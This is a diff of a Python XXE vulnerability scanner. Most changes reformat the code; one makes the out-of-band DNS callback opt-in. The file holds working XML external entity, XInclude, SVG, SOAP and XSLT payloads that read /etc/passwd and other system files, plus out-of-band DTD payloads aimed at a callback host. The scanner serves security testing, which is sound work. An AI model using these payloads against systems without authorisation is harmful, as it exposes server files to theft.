@@ -10,6 +10,7 @@ Detection Methods:
   6. XInclude injection
   7. XSLT injection (secondary)
 """
+
 import random
 import re
 import string
@@ -19,7 +20,6 @@ from urllib.parse import parse_qs, urlencode, urlparse, urlunparse
 
 import requests
 
-from tools.http_client import HttpClient
 from tools.log_utils import get_logger
 from tools.settings import settings
 
@@ -27,67 +27,62 @@ logger = get_logger("xxe")
 
 
 FILE_READ_PAYLOADS = [
-    '''<?xml version="1.0" encoding="UTF-8"?>
+    """<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE data [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
-<data>&xxe;</data>''',
-
-    '''<?xml version="1.0" encoding="UTF-8"?>
+<data>&xxe;</data>""",
+    """<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE data [
   <!ENTITY xxe SYSTEM "file:///etc/hostname">
 ]>
-<data>&xxe;</data>''',
-
-    '''<?xml version="1.0" encoding="UTF-8"?>
+<data>&xxe;</data>""",
+    """<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE data [
   <!ENTITY % dtd SYSTEM "http://127.0.0.1:8888/xxe.dtd">
   %dtd;
 ]>
-<data>&send;</data>''',
+<data>&send;</data>""",
 ]
 
 ERROR_PAYLOADS = [
-    '''<?xml version="1.0" encoding="UTF-8"?>
+    """<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE data [
   <!ENTITY xxe SYSTEM "file:///nonexistent_aimy_xxe_file_12345">
 ]>
-<data>&xxe;</data>''',
-
-    '''<?xml version="1.0" encoding="UTF-8"?>
+<data>&xxe;</data>""",
+    """<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE data [
   <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
 ]>
-<data>&xxe;</data>''',
+<data>&xxe;</data>""",
 ]
 
 OOB_PAYLOADS = [
-    '''<?xml version="1.0" encoding="UTF-8"?>
+    """<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE data [
   <!ENTITY xxe SYSTEM "http://{domain}/">
 ]>
-<data>&xxe;</data>''',
-
-    '''<?xml version="1.0" encoding="UTF-8"?>
+<data>&xxe;</data>""",
+    """<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE data [
   <!ENTITY % dtd SYSTEM "http://{domain}/xxe.dtd">
   %dtd;
 ]>
-<data>&send;</data>''',
+<data>&send;</data>""",
 ]
 
 XINCLUDE_PAYLOADS = [
-    '''<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+    """<foo xmlns:xi="http://www.w3.org/2001/XInclude">
   <xi:include parse="text" href="file:///etc/passwd"/>
-</foo>''',
-
-    '''<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+</foo>""",
+    """<foo xmlns:xi="http://www.w3.org/2001/XInclude">
   <xi:include parse="text" href="file:///etc/hostname"/>
-</foo>''',
+</foo>""",
 ]
 
 SOAP_PAYLOADS = [
-    '''<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+    """<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
   <soap:Body>
     <data>
       <!DOCTYPE foo [
@@ -96,26 +91,26 @@ SOAP_PAYLOADS = [
       <value>&xxe;</value>
     </data>
   </soap:Body>
-</soap:Envelope>''',
+</soap:Envelope>""",
 ]
 
 SVG_PAYLOADS = [
-    '''<?xml version="1.0" standalone="yes"?>
+    """<?xml version="1.0" standalone="yes"?>
 <!DOCTYPE svg [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
 <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
   <text font-size="16" x="0" y="16">&xxe;</text>
-</svg>''',
+</svg>""",
 ]
 
 XSLT_PAYLOADS = [
-    '''<?xml version="1.0" encoding="UTF-8"?>
+    """<?xml version="1.0" encoding="UTF-8"?>
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
   <xsl:template match="/">
     <xsl:value-of select="document('file:///etc/passwd')"/>
   </xsl:template>
-</xsl:stylesheet>''',
+</xsl:stylesheet>""",
 ]
 
 
@@ -128,15 +123,19 @@ class XXEDetector:
         result = detector.check(url, param)
     """
 
-    def __init__(self, sess: 'requests.Session' = None, timeout: float = 10.0,
-                 waf_name: str = None):
-        self.sess = sess or HttpClient()
+    def __init__(
+        self, sess: "requests.Session" = None, timeout: float = 10.0, waf_name: str = None
+    ):
+        if sess is None:
+            sess = requests.Session()
+            sess.verify = settings.verify_ssl
+        self.sess = sess
         self.timeout = timeout
         self.waf_name = waf_name
         self.oob_server = None
 
     def _random_suffix(self, length=8) -> str:
-        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
+        return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))
 
     def _inject_param(self, url: str, param: str, value: str) -> str:
         parsed = urlparse(url)
@@ -145,19 +144,37 @@ class XXEDetector:
         new_qs = urlencode(qs, doseq=True)
         return urlunparse(parsed._replace(query=new_qs))
 
-    def _make_request(self, url: str, method="GET", data=None,
-                      headers=None, raw_body=None, **kwargs) -> Tuple[Optional[int], str, float]:
+    def _make_request(
+        self, url: str, method="GET", data=None, headers=None, raw_body=None, **kwargs
+    ) -> Tuple[Optional[int], str, float]:
         try:
             start = time.time()
             if raw_body is not None:
-                resp = self.sess.post(url, data=raw_body, headers=headers,
-                                      timeout=self.timeout, allow_redirects=False, verify=settings.verify_ssl)
+                resp = self.sess.post(
+                    url,
+                    data=raw_body,
+                    headers=headers,
+                    timeout=self.timeout,
+                    allow_redirects=False,
+                    verify=settings.verify_ssl,
+                )
             elif method == "POST":
-                resp = self.sess.post(url, data=data, headers=headers,
-                                      timeout=self.timeout, allow_redirects=False, verify=settings.verify_ssl)
+                resp = self.sess.post(
+                    url,
+                    data=data,
+                    headers=headers,
+                    timeout=self.timeout,
+                    allow_redirects=False,
+                    verify=settings.verify_ssl,
+                )
             else:
-                resp = self.sess.get(url, headers=headers, timeout=self.timeout,
-                                     allow_redirects=False, verify=settings.verify_ssl)
+                resp = self.sess.get(
+                    url,
+                    headers=headers,
+                    timeout=self.timeout,
+                    allow_redirects=False,
+                    verify=settings.verify_ssl,
+                )
             elapsed = time.time() - start
             return resp.status_code, resp.text, elapsed
         except Exception as e:
@@ -189,8 +206,9 @@ class XXEDetector:
             "high_confidence_count": len(high_conf),
         }
 
-    def _check_param_based(self, url: str, param: str,
-                           is_post: bool, post_data: Dict) -> List[Dict]:
+    def _check_param_based(
+        self, url: str, param: str, is_post: bool, post_data: Dict
+    ) -> List[Dict]:
         findings = []
 
         # Method 1: In-band file read
@@ -206,15 +224,17 @@ class XXEDetector:
                     _, body, _ = self._make_request(test_url, "GET")
 
                 if body:
-                    if "root:" in body or re.search(r'uid=\d+', body):
-                        findings.append({
-                            "method": "in_band_file_read",
-                            "payload": payload[:200],
-                            "confidence": 0.85,
-                            "confirmed": True,
-                            "evidence": body[:300],
-                            "file": "/etc/passwd",
-                        })
+                    if "root:" in body or re.search(r"uid=\d+", body):
+                        findings.append(
+                            {
+                                "method": "in_band_file_read",
+                                "payload": payload[:200],
+                                "confidence": 0.85,
+                                "confirmed": True,
+                                "evidence": body[:300],
+                                "file": "/etc/passwd",
+                            }
+                        )
                         break
             except Exception as e:
                 logger.debug("In-band XXE check failed: %s", e)
@@ -233,27 +253,38 @@ class XXEDetector:
 
                 if body:
                     error_patterns = [
-                        r'xml.*error', r'entity.*not.*defined', r'external.*entity',
-                        r'xml.*parser', r'dtd.*error', r'no such file',
-                        r'failed to load', r'xmlreader',
+                        r"xml.*error",
+                        r"entity.*not.*defined",
+                        r"external.*entity",
+                        r"xml.*parser",
+                        r"dtd.*error",
+                        r"no such file",
+                        r"failed to load",
+                        r"xmlreader",
                     ]
                     for pattern in error_patterns:
                         if re.search(pattern, body, re.I):
-                            findings.append({
-                                "method": "error_based",
-                                "payload": payload[:200],
-                                "confidence": 0.60,
-                                "confirmed": False,
-                                "evidence": body[:300],
-                                "error_pattern": pattern,
-                            })
+                            findings.append(
+                                {
+                                    "method": "error_based",
+                                    "payload": payload[:200],
+                                    "confidence": 0.60,
+                                    "confirmed": False,
+                                    "evidence": body[:300],
+                                    "error_pattern": pattern,
+                                }
+                            )
                             break
             except Exception as e:
                 logger.debug("Error-based XXE check failed: %s", e)
 
-        # Method 3: OOB detection (DNS callback)
+        # Method 3: OOB detection (DNS callback, opt-in via AIMY_OOB_DOMAIN)
+        oob_domain = None
+        if settings.oob_domain.strip():
+            oob_domain = "aimy-xxe-%s.%s" % (self._random_suffix(6), settings.oob_domain.strip())
         try:
-            oob_domain = "aimy-xxe-%s.oast.fun" % self._random_suffix(6)
+            if not oob_domain:
+                return findings
             for payload_template in OOB_PAYLOADS[:1]:
                 payload = payload_template.replace("{domain}", oob_domain)
                 if is_post and post_data:
@@ -267,17 +298,20 @@ class XXEDetector:
 
                 time.sleep(2)
                 import socket
+
                 try:
                     resolved = socket.getaddrinfo(oob_domain, 80)
                     if resolved:
-                        findings.append({
-                            "method": "oob_dns",
-                            "payload": payload[:200],
-                            "confidence": 0.90,
-                            "confirmed": True,
-                            "oob_domain": oob_domain,
-                            "resolved": True,
-                        })
+                        findings.append(
+                            {
+                                "method": "oob_dns",
+                                "payload": payload[:200],
+                                "confidence": 0.90,
+                                "confirmed": True,
+                                "oob_domain": oob_domain,
+                                "resolved": True,
+                            }
+                        )
                         break
                 except socket.gaierror:
                     pass
@@ -293,13 +327,15 @@ class XXEDetector:
             headers = {"Content-Type": "application/xml"}
             _, body, _ = self._make_request(url, "POST", raw_body=payload, headers=headers)
             if body and "root:" in body:
-                findings.append({
-                    "method": "direct_xml_endpoint",
-                    "payload": payload[:200],
-                    "confidence": 0.80,
-                    "confirmed": True,
-                    "evidence": body[:300],
-                })
+                findings.append(
+                    {
+                        "method": "direct_xml_endpoint",
+                        "payload": payload[:200],
+                        "confidence": 0.80,
+                        "confirmed": True,
+                        "evidence": body[:300],
+                    }
+                )
         except Exception as e:
             logger.debug("Direct XML endpoint check failed: %s", e)
         return findings
@@ -311,16 +347,20 @@ class XXEDetector:
                 headers = {"Content-Type": "image/svg+xml"}
                 upload_urls = [url, url.rstrip("/") + "/upload", url.rstrip("/") + "/api/upload"]
                 for upload_url in upload_urls:
-                    _, body, _ = self._make_request(upload_url, "POST", raw_body=payload, headers=headers)
+                    _, body, _ = self._make_request(
+                        upload_url, "POST", raw_body=payload, headers=headers
+                    )
                     if body and "root:" in body:
-                        findings.append({
-                            "method": "svg_upload",
-                            "payload": payload[:200],
-                            "confidence": 0.80,
-                            "confirmed": True,
-                            "evidence": body[:300],
-                            "upload_url": upload_url,
-                        })
+                        findings.append(
+                            {
+                                "method": "svg_upload",
+                                "payload": payload[:200],
+                                "confidence": 0.80,
+                                "confirmed": True,
+                                "evidence": body[:300],
+                                "upload_url": upload_url,
+                            }
+                        )
                         break
         except Exception as e:
             logger.debug("SVG upload XXE check failed: %s", e)
@@ -333,13 +373,15 @@ class XXEDetector:
                 headers = {"Content-Type": "application/xml"}
                 _, body, _ = self._make_request(url, "POST", raw_body=payload, headers=headers)
                 if body and "root:" in body:
-                    findings.append({
-                        "method": "xinclude",
-                        "payload": payload[:200],
-                        "confidence": 0.75,
-                        "confirmed": True,
-                        "evidence": body[:300],
-                    })
+                    findings.append(
+                        {
+                            "method": "xinclude",
+                            "payload": payload[:200],
+                            "confidence": 0.75,
+                            "confirmed": True,
+                            "evidence": body[:300],
+                        }
+                    )
                     break
             except Exception as e:
                 logger.debug("XInclude check failed: %s", e)
@@ -352,13 +394,15 @@ class XXEDetector:
                 headers = {"Content-Type": "text/xml; charset=utf-8"}
                 _, body, _ = self._make_request(url, "POST", raw_body=payload, headers=headers)
                 if body and "root:" in body:
-                    findings.append({
-                        "method": "soap_injection",
-                        "payload": payload[:200],
-                        "confidence": 0.75,
-                        "confirmed": True,
-                        "evidence": body[:300],
-                    })
+                    findings.append(
+                        {
+                            "method": "soap_injection",
+                            "payload": payload[:200],
+                            "confidence": 0.75,
+                            "confirmed": True,
+                            "evidence": body[:300],
+                        }
+                    )
                     break
             except Exception as e:
                 logger.debug("SOAP XXE check failed: %s", e)
@@ -371,16 +415,20 @@ class XXEDetector:
                 headers = {"Content-Type": "application/xml"}
                 xslt_urls = [url, url.rstrip("/") + "/transform", url.rstrip("/") + "/xslt"]
                 for xslt_url in xslt_urls:
-                    _, body, _ = self._make_request(xslt_url, "POST", raw_body=payload, headers=headers)
+                    _, body, _ = self._make_request(
+                        xslt_url, "POST", raw_body=payload, headers=headers
+                    )
                     if body and "root:" in body:
-                        findings.append({
-                            "method": "xslt_injection",
-                            "payload": payload[:200],
-                            "confidence": 0.70,
-                            "confirmed": True,
-                            "evidence": body[:300],
-                            "xslt_url": xslt_url,
-                        })
+                        findings.append(
+                            {
+                                "method": "xslt_injection",
+                                "payload": payload[:200],
+                                "confidence": 0.70,
+                                "confirmed": True,
+                                "evidence": body[:300],
+                                "xslt_url": xslt_url,
+                            }
+                        )
                         break
             except Exception as e:
                 logger.debug("XSLT XXE check failed: %s", e)
